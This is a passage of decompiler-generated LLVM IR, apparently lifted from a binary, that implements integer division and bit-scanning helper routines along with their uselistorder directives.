.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12994 = phi i32 [ %v6_12988, %bb85 ], [ %v1_12988, %.thread7 ], [ %v6_12988, %bb86 ]
  %v1_12998 = phi i32 [ %v1_1298c, %bb85 ], [ %v1_1298c, %.thread7 ], [ %v6_1298c, %bb86 ]
  %v4_12990 = udiv i32 %v1_129b0, 4
  %v6_12990 = icmp ult i32 %v1_12994, %v4_12990
  br i1 %v6_12990, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12994 = and i32 %v1_129b0, 2
  %v4_12994 = icmp eq i32 %v3_12994, 0
  %v6_12994 = sub i32 %v1_12994, %v4_12990
  br i1 %v4_12994, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12998 = udiv i32 %v1_129ac, 4
  %v6_12998 = or i32 %v1_12998, %v5_12998
  store i32 %v6_12998, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_129a0 = phi i32 [ %v6_12994, %bb87 ], [ %v1_12994, %.thread8 ], [ %v6_12994, %bb88 ]
  %v1_129a4 = phi i32 [ %v1_12998, %bb87 ], [ %v1_12998, %.thread8 ], [ %v6_12998, %bb88 ]
  %v4_1299c = udiv i32 %v1_129b0, 8
  %v6_1299c = icmp ult i32 %v1_129a0, %v4_1299c
  br i1 %v6_1299c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_129a0 = and i32 %v1_129b0, 4
  %v4_129a0 = icmp eq i32 %v3_129a0, 0
  %v6_129a0 = sub i32 %v1_129a0, %v4_1299c
  br i1 %v4_129a0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_129a4 = udiv i32 %v1_129ac, 8
  %v6_129a4 = or i32 %v1_129a4, %v5_129a4
  store i32 %v6_129a4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_129b8 = phi i32 [ %v1_129a4, %bb89 ], [ %v1_129a4, %.thread9 ], [ %v6_129a4, %bb90 ]
  %v0_129a8 = phi i32 [ %v6_129a0, %bb89 ], [ %v1_129a0, %.thread9 ], [ %v6_129a0, %bb90 ]
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  br i1 %v2_129a8, label %dec_label_pc_129b8, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_129ac = udiv i32 %v1_129ac, 16
  store i32 %v4_129ac, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_129ac, 16
  br i1 %tmp138, label %dec_label_pc_129b8, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_129b0 = udiv i32 %v1_129b0, 16
  br label %dec_label_pc_12978

dec_label_pc_129b8:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_129b8

dec_label_pc_129c0:                               ; preds = %dec_label_pc_1292c
  %v9_1292c = icmp eq i32 %v0_1292c, %v1_1292c
  %. = zext i1 %v9_1292c to i32
  ret i32 %.

dec_label_pc_129cc:                               ; preds = %dec_label_pc_12934
  %v2_129cc = icmp ugt i32 %v1_1292c, 65535
  br i1 %v2_129cc, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_129cc
  %v2_129d0 = and i32 %v1_1292c, 32768
  %v3_129d0 = icmp eq i32 %v2_129d0, 0
  %v4_129d0 = udiv i32 %v1_1292c, 65536
  br i1 %v3_129d0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_129cc
  %v0_129dc65 = phi i32 [ %v1_1292c, %dec_label_pc_129cc ], [ %v4_129d0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_129e0 = phi i32 [ %v0_129dc65, %.thread16 ], [ %v4_129d0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_129dc = icmp ugt i32 %v1_129e0, 255
  br i1 %v2_129dc, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_129e0 = and i32 %v1_129e0, 128
  %v3_129e0 = icmp eq i32 %v2_129e0, 0
  %v4_129e0 = udiv i32 %v1_129e0, 256
  br i1 %v3_129e0, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_129e4 = or i32 %storemerge, 8
  store i32 %v2_129e4, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_129f0 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_129e4, %bb98 ]
  %v1_129ec = phi i32 [ %v1_129e0, %bb96 ], [ %v4_129e0, %bb97 ], [ %v4_129e0, %bb98 ]
  %v2_129e8 = icmp ugt i32 %v1_129ec, 15
  br i1 %v2_129e8, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_129ec = and i32 %v1_129ec, 8
  %v3_129ec = icmp eq i32 %v2_129ec, 0
  %v4_129ec = udiv i32 %v1_129ec, 16
  br i1 %v3_129ec, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_129f0 = add nsw i32 %v1_129f0, 4
  store i32 %v2_129f0, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_129f8 = phi i32 [ %v1_129f0, %.thread17 ], [ %v1_129f0, %bb99 ], [ %v2_129f0, %bb100 ]
  %v5_129fc = phi i32 [ %v1_129ec, %.thread17 ], [ %v4_129ec, %bb99 ], [ %v4_129ec, %bb100 ]
  %v2_129f4 = icmp ugt i32 %v5_129fc, 3
  %v7_129f4 = icmp eq i32 %v5_129fc, 4
  %v2_129f8 = xor i1 %v7_129f4, true
  %v3_129f8 = and i1 %v2_129f4, %v2_129f8
  br i1 %v3_129f8, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_129f8 = add nsw i32 %v4_129f8, 3
  store i32 %v5_129f8, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_129fc = phi i32 [ %v4_129f8, %.thread18 ], [ %v5_129f8, %bb101 ]
  %v2_129fc = xor i1 %v2_129f4, true
  %v3_129fc = or i1 %v7_129f4, %v2_129fc
  br i1 %v3_129fc, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_129fc = udiv i32 %v5_129fc, 2
  %v9_129fc = add i32 %v4_129fc, %v8_129fc
  store i32 %v9_129fc, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12a00 = phi i32 [ %v4_129fc, %bb102 ], [ %v9_129fc, %bb103 ]
  %v6_12a00 = lshr i32 %v0_1292c, %v1_12a00
  ret i32 %v6_12a00

dec_label_pc_12a08:                               ; preds = %dec_label_pc_12920
  %v0_12a08 = load i32, i32* @lr, align 4
  %v0_12a0c = call i32 @function_12b78()
  store i32 %v0_12a08, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_129fc, { 1, 0 }
  uselistorder i1 %v7_129f4, { 1, 0 }
  uselistorder i32 %v4_129ec, { 1, 0 }
  uselistorder i32 %v1_129ec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_129e4, { 1, 0 }
  uselistorder i32 %v4_129e0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_129e0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_129d0, { 1, 0 }
  uselistorder i32 %v0_129a8, { 1, 0 }
  uselistorder i32 %v4_1299c, { 1, 0 }
  uselistorder i32 %v1_129a4, { 1, 2, 0 }
  uselistorder i32 %v4_12990, { 1, 0 }
  uselistorder i32 %v1_12998, { 1, 2, 0 }
  uselistorder i32 %v4_12984, { 1, 0 }
  uselistorder i32 %v1_1298c, { 1, 2, 0 }
  uselistorder i32 %v1_129b0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12980, { 1, 0 }
  uselistorder i32 %v3_1296c, { 2, 0, 1 }
  uselistorder i32 %v3_12968, { 1, 0 }
  uselistorder i32 %v1_12968, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1296c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12958, { 2, 0, 1 }
  uselistorder i32 %v4_12954, { 2, 1, 0 }
  uselistorder i32 %v1_12958, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12960.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_1292c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_1292c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12920, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_129b8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12974, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12960thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_12a1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a1c:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12a20 = call i32 @function_12920()
  store i32 %arg2, i32* @r2, align 4
  ret i32 %v0_12a20
}

define i32 @function_12a34() local_unnamed_addr {
dec_label_pc_12a34:
  %v0_12a34 = load i32, i32* @r1, align 4
  %v1_12a34 = icmp slt i32 %v0_12a34, 0
  %v2_12a34 = icmp eq i32 %v0_12a34, 0
  %v0_12a38 = load i32, i32* @r0, align 4
  %v2_12a38 = xor i32 %v0_12a38, %v0_12a34
  br i1 %v2_12a34, label %dec_label_pc_12b4c, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a34
  br i1 %v1_12a34, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12a40
  %v2_12a40 = sub i32 0, %v0_12a34
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12a40, %bb
  %v1_12b0c = phi i32 [ %v2_12a40, %bb ], [ %v0_12a34, %dec_label_pc_12a40 ]
  %v1_12a44 = add i32 %v1_12b0c, -1
  %v7_12a44 = icmp eq i32 %v1_12b0c, 1
  br i1 %v7_12a44, label %dec_label_pc_12aec, label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %thread-pre-split
  %v1_12a4c = icmp slt i32 %v0_12a38, 0
  br i1 %v1_12a4c, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_12a4c
  %v2_12a50 = sub i32 0, %v0_12a38
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_12a4c, %bb84
  %v0_12b40 = phi i32 [ %v0_12a38, %dec_label_pc_12a4c ], [ %v2_12a50, %bb84 ]
  %v3_12a54 = icmp uge i32 %v0_12b40, %v1_12b0c
  %v9_12a54 = icmp eq i32 %v0_12b40, %v1_12b0c
  %v2_12a58 = xor i1 %v3_12a54, true
  %v3_12a58 = or i1 %v9_12a54, %v2_12a58
  br i1 %v3_12a58, label %dec_label_pc_12af8, label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %bb85
  %v2_12a5c = and i32 %v1_12a44, %v1_12b0c
  %v4_12a5c = icmp eq i32 %v2_12a5c, 0
  br i1 %v4_12a5c, label %dec_label_pc_12b08, label %dec_label_pc_12a64

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a5c
  %v3_12a64 = icmp ult i32 %v1_12b0c, 536870912
  br i1 %v3_12a64, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12a64
  %v4_12a68 = mul i32 %v1_12b0c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12a64, %.thread
  %v0_12a88.pr40.ph = phi i32 [ %v4_12a68, %.thread ], [ %v1_12b0c, %dec_label_pc_12a64 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12a64 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_12a88.pr40 = phi i32 [ %v4_12a7c, %bb88 ], [ %v0_12a88.pr40.ph, %.preheader.preheader ]
  %v1_12a80 = phi i32 [ %v4_12a80, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_12a74 = icmp ugt i32 %v0_12a88.pr40, 268435455
  br i1 %v2_12a74, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12a88thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_12a78 = icmp ult i32 %v0_12a88.pr40, %v0_12b40
  br i1 %v4_12a78, label %bb87, label %dec_label_pc_12a88thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_12a7c = and i32 %v0_12a88.pr40, 268435456
  %v3_12a7c = icmp eq i32 %v2_12a7c, 0
  %v4_12a7c = mul i32 %v0_12a88.pr40, 16
  br i1 %v3_12a7c, label %bb88, label %dec_label_pc_12a88.loopexit

bb88:                                             ; preds = %bb87
  %v2_12a80 = and i32 %v1_12a80, 268435456
  %v3_12a80 = icmp eq i32 %v2_12a80, 0
  %v4_12a80 = mul i32 %v1_12a80, 16
  br i1 %v3_12a80, label %.preheader, label %dec_label_pc_12a88thread-pre-split.loopexit.loopexit

dec_label_pc_12a88thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_12a9452.ph = phi i32 [ %v1_12a80, %bb86 ], [ %v4_12a80, %bb88 ]
  %v0_12a88.pr42.ph = phi i32 [ %v0_12a88.pr40, %bb86 ], [ %v4_12a7c, %bb88 ]
  br label %dec_label_pc_12a88thread-pre-split.loopexit

dec_label_pc_12a88thread-pre-split.loopexit:      ; preds = %dec_label_pc_12a88thread-pre-split.loopexit.loopexit, %.thread3
  %v1_12a9452 = phi i32 [ %v1_12a80, %.thread3 ], [ %v1_12a9452.ph, %dec_label_pc_12a88thread-pre-split.loopexit.loopexit ]
  %v0_12a88.pr42 = phi i32 [ %v0_12a88.pr40, %.thread3 ], [ %v0_12a88.pr42.ph, %dec_label_pc_12a88thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12a88thread-pre-split

dec_label_pc_12a88thread-pre-split:               ; preds = %dec_label_pc_12a88thread-pre-split.loopexit, %bb90
  %v1_12a9450 = phi i32 [ %v1_12a9452, %dec_label_pc_12a88thread-pre-split.loopexit ], [ %v3_12a94, %bb90 ]
  %v2_12a8c48 = phi i32 [ %v0_12b40, %dec_label_pc_12a88thread-pre-split.loopexit ], [ %v2_12a8c, %bb90 ]
  %v0_12a88.pr = phi i32 [ %v0_12a88.pr42, %dec_label_pc_12a88thread-pre-split.loopexit ], [ %v3_12a90, %bb90 ]
  br label %dec_label_pc_12a88

dec_label_pc_12a88.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_12a88

dec_label_pc_12a88:                               ; preds = %dec_label_pc_12a88.loopexit, %dec_label_pc_12a88thread-pre-split
  %v1_12a94 = phi i32 [ %v1_12a9450, %dec_label_pc_12a88thread-pre-split ], [ %v1_12a80, %dec_label_pc_12a88.loopexit ]
  %v2_12a8c = phi i32 [ %v2_12a8c48, %dec_label_pc_12a88thread-pre-split ], [ %v0_12b40, %dec_label_pc_12a88.loopexit ]
  %v1_12a90 = phi i32 [ %v0_12a88.pr, %dec_label_pc_12a88thread-pre-split ], [ %v4_12a7c, %dec_label_pc_12a88.loopexit ]
  %v2_12a88 = icmp slt i32 %v1_12a90, 0
  br i1 %v2_12a88, label %dec_label_pc_12a9c, label %bb89

bb89:                                             ; preds = %dec_label_pc_12a88
  %v4_12a8c = icmp ult i32 %v1_12a90, %v2_12a8c
  br i1 %v4_12a8c, label %bb90, label %dec_label_pc_12a9c

bb90:                                             ; preds = %bb89
  %v3_12a90 = mul i32 %v1_12a90, 2
  %v2_12a94 = icmp slt i32 %v1_12a94, 0
  %v3_12a94 = mul i32 %v1_12a94, 2
  br i1 %v2_12a94, label %dec_label_pc_12a9c, label %dec_label_pc_12a88thread-pre-split

dec_label_pc_12a9c:                               ; preds = %bb89, %dec_label_pc_12a88, %bb90
  %v2_12aa863 = phi i32 [ %v3_12a94, %bb90 ], [ %v1_12a94, %bb89 ], [ %v1_12a94, %dec_label_pc_12a88 ]
  %v1_12aa055 = phi i32 [ %v3_12a90, %bb90 ], [ %v1_12a90, %bb89 ], [ %v1_12a90, %dec_label_pc_12a88 ]
  br label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %.thread13, %dec_label_pc_12a9c
  %v1_12ad4 = phi i32 [ %v4_12ad4, %.thread13 ], [ %v2_12aa863, %dec_label_pc_12a9c ]
  %v1_12aa8 = phi i32 [ %v1_12ae4, %.thread13 ], [ 0, %dec_label_pc_12a9c ]
  %v1_12ad8 = phi i32 [ %v4_12ad8, %.thread13 ], [ %v1_12aa055, %dec_label_pc_12a9c ]
  %v1_12aa4 = phi i32 [ %v0_12ad0, %.thread13 ], [ %v0_12b40, %dec_label_pc_12a9c ]
  %v3_12aa0 = icmp ult i32 %v1_12aa4, %v1_12ad8
  br i1 %v3_12aa0, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_12aa0
  %v3_12aa4 = sub i32 %v1_12aa4, %v1_12ad8
  %v3_12aa8 = or i32 %v1_12aa8, %v1_12ad4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12aa0, %bb91
  %v1_12ab0 = phi i32 [ %v1_12aa4, %dec_label_pc_12aa0 ], [ %v3_12aa4, %bb91 ]
  %v1_12ab4 = phi i32 [ %v1_12aa8, %dec_label_pc_12aa0 ], [ %v3_12aa8, %bb91 ]
  %v4_12aac = udiv i32 %v1_12ad8, 2
  %v6_12aac = icmp ult i32 %v1_12ab0, %v4_12aac
  br i1 %v6_12aac, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_12ab0 = urem i32 %v1_12ad8, 2
  %v4_12ab0 = icmp eq i32 %v3_12ab0, 0
  %v6_12ab0 = sub i32 %v1_12ab0, %v4_12aac
  br i1 %v4_12ab0, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_12ab4 = udiv i32 %v1_12ad4, 2
  %v6_12ab4 = or i32 %v1_12ab4, %v5_12ab4
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_12abc = phi i32 [ %v6_12ab0, %bb92 ], [ %v1_12ab0, %.thread8 ], [ %v6_12ab0, %bb93 ]
  %v1_12ac0 = phi i32 [ %v1_12ab4, %bb92 ], [ %v1_12ab4, %.thread8 ], [ %v6_12ab4, %bb93 ]
  %v4_12ab8 = udiv i32 %v1_12ad8, 4
  %v6_12ab8 = icmp ult i32 %v1_12abc, %v4_12ab8
  br i1 %v6_12ab8, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_12abc = and i32 %v1_12ad8, 2
  %v4_12abc = icmp eq i32 %v3_12abc, 0
  %v6_12abc = sub i32 %v1_12abc, %v4_12ab8
  br i1 %v4_12abc, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_12ac0 = udiv i32 %v1_12ad4, 4
  %v6_12ac0 = or i32 %v1_12ac0, %v5_12ac0
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_12ac8 = phi i32 [ %v6_12abc, %bb94 ], [ %v1_12abc, %.thread9 ], [ %v6_12abc, %bb95 ]
  %v1_12acc = phi i32 [ %v1_12ac0, %bb94 ], [ %v1_12ac0, %.thread9 ], [ %v6_12ac0, %bb95 ]
  %v4_12ac4 = udiv i32 %v1_12ad8, 8
  %v6_12ac4 = icmp ult i32 %v1_12ac8, %v4_12ac4
  br i1 %v6_12ac4, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_12ac8 = and i32 %v1_12ad8, 4
  %v4_12ac8 = icmp eq i32 %v3_12ac8, 0
  %v6_12ac8 = sub i32 %v1_12ac8, %v4_12ac4
  br i1 %v4_12ac8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_12acc = udiv i32 %v1_12ad4, 8
  %v6_12acc = or i32 %v1_12acc, %v5_12acc
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_12ae4 = phi i32 [ %v1_12acc, %bb96 ], [ %v1_12acc, %.thread10 ], [ %v6_12acc, %bb97 ]
  %v0_12ad0 = phi i32 [ %v6_12ac8, %bb96 ], [ %v1_12ac8, %.thread10 ], [ %v6_12ac8, %bb97 ]
  %v2_12ad0 = icmp eq i32 %v0_12ad0, 0
  br i1 %v2_12ad0, label %dec_label_pc_12ae0, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12ad4, 16
  br i1 %tmp, label %dec_label_pc_12ae0, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_12ad4 = udiv i32 %v1_12ad4, 16
  %v4_12ad8 = udiv i32 %v1_12ad8, 16
  br label %dec_label_pc_12aa0

dec_label_pc_12ae0:                               ; preds = %thread-pre-split12, %bb98
  %v1_12ae0 = icmp slt i32 %v2_12a38, 0
  br i1 %v1_12ae0, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_12ae0
  %v2_12ae4 = sub i32 0, %v1_12ae4
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_12aec, %dec_label_pc_12ae0, %bb99
  %v1_12ae8 = phi i32 [ %v1_12ae4, %dec_label_pc_12ae0 ], [ %v2_12ae4, %bb99 ], [ %v2_12af0, %bb100 ], [ undef, %dec_label_pc_12aec ], [ %v1_12b0480, %bb102 ], [ %v2_12b00, %bb103 ]
  ret i32 %v1_12ae8

dec_label_pc_12aec:                               ; preds = %thread-pre-split
  br i1 %v1_12a34, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12aec
  %v2_12af0 = sub i32 0, %v0_12a38
  br label %.thread16

dec_label_pc_12af8:                               ; preds = %bb85
  br i1 %v3_12a54, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_12af8
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_12af8, %bb101
  %v1_12b0480 = phi i32 [ %v0_12a38, %dec_label_pc_12af8 ], [ 0, %bb101 ]
  br i1 %v9_12a54, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_12afc = ashr i32 %v2_12a38, 31
  %v2_12b00 = or i32 %v4_12afc, 1
  br label %.thread16

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12a5c
  %v2_12b08 = icmp ugt i32 %v1_12b0c, 65535
  br i1 %v2_12b08, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_12b08
  %v2_12b0c = and i32 %v1_12b0c, 32768
  %v3_12b0c = icmp eq i32 %v2_12b0c, 0
  %v4_12b0c = udiv i32 %v1_12b0c, 65536
  br i1 %v3_12b0c, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_12b08
  %v0_12b1870 = phi i32 [ %v1_12b0c, %dec_label_pc_12b08 ], [ %v4_12b0c, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_12b1c = phi i32 [ %v0_12b1870, %.thread19 ], [ %v4_12b0c, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_12b18 = icmp ugt i32 %v1_12b1c, 255
  br i1 %v2_12b18, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_12b1c = and i32 %v1_12b1c, 128
  %v3_12b1c = icmp eq i32 %v2_12b1c, 0
  %v4_12b1c = udiv i32 %v1_12b1c, 256
  br i1 %v3_12b1c, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_12b20 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_12b2c = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_12b20, %bb107 ]
  %v1_12b28 = phi i32 [ %v1_12b1c, %bb105 ], [ %v4_12b1c, %bb106 ], [ %v4_12b1c, %bb107 ]
  %v2_12b24 = icmp ugt i32 %v1_12b28, 15
  br i1 %v2_12b24, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_12b28 = and i32 %v1_12b28, 8
  %v3_12b28 = icmp eq i32 %v2_12b28, 0
  %v4_12b28 = udiv i32 %v1_12b28, 16
  br i1 %v3_12b28, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_12b2c = add nsw i32 %v1_12b2c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_12b34 = phi i32 [ %v1_12b2c, %.thread20 ], [ %v1_12b2c, %bb108 ], [ %v2_12b2c, %bb109 ]
  %v5_12b38 = phi i32 [ %v1_12b28, %.thread20 ], [ %v4_12b28, %bb108 ], [ %v4_12b28, %bb109 ]
  %v2_12b30 = icmp ugt i32 %v5_12b38, 3
  %v7_12b30 = icmp eq i32 %v5_12b38, 4
  %v2_12b34 = xor i1 %v7_12b30, true
  %v3_12b34 = and i1 %v2_12b30, %v2_12b34
  br i1 %v3_12b34, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_12b34 = add nsw i32 %v4_12b34, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_12b38 = phi i32 [ %v4_12b34, %.thread21 ], [ %v5_12b34, %bb110 ]
  %v2_12b38 = xor i1 %v2_12b30, true
  %v3_12b38 = or i1 %v7_12b30, %v2_12b38
  br i1 %v3_12b38, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_12b38 = udiv i32 %v5_12b38, 2
  %v9_12b38 = add i32 %v4_12b38, %v8_12b38
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_12b40 = phi i32 [ %v4_12b38, %bb111 ], [ %v9_12b38, %bb112 ]
  %v1_12b3c = icmp slt i32 %v2_12a38, 0
  %v6_12b40 = lshr i32 %v0_12b40, %v1_12b40
  %v2_12b44 = sub i32 0, %v6_12b40
  %v2_12b44.v6_12b40 = select i1 %v1_12b3c, i32 %v2_12b44, i32 %v6_12b40
  ret i32 %v2_12b44.v6_12b40

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12a34
  %v0_12b50 = call i32 @function_12b78()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12b38, { 1, 0 }
  uselistorder i1 %v7_12b30, { 1, 0 }
  uselistorder i32 %v4_12b28, { 1, 0 }
  uselistorder i32 %v1_12b28, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b1c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12b1c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b0c, { 1, 0 }
  uselistorder i32 %v0_12ad0, { 1, 0 }
  uselistorder i32 %v4_12ac4, { 1, 0 }
  uselistorder i32 %v1_12acc, { 1, 2, 0 }
  uselistorder i32 %v4_12ab8, { 1, 0 }
  uselistorder i32 %v1_12ac0, { 1, 2, 0 }
  uselistorder i32 %v4_12aac, { 1, 0 }
  uselistorder i32 %v1_12ab4, { 1, 2, 0 }
  uselistorder i32 %v1_12ad8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12aa8, { 1, 0 }
  uselistorder i32 %v1_12ad4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12a94, { 1, 0 }
  uselistorder i32 %v3_12a90, { 1, 0 }
  uselistorder i32 %v1_12a90, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12a8c, { 1, 0 }
  uselistorder i32 %v1_12a94, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12a80, { 1, 0 }
  uselistorder i32 %v4_12a7c, { 2, 1, 0 }
  uselistorder i32 %v1_12a80, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12a88.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_12a54, { 1, 0 }
  uselistorder i32 %v1_12b0c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12a38, { 1, 0, 2 }
  uselistorder i32 %v0_12a38, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_12a34, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_12b78, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12ae0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12a9c, { 2, 0, 1 }
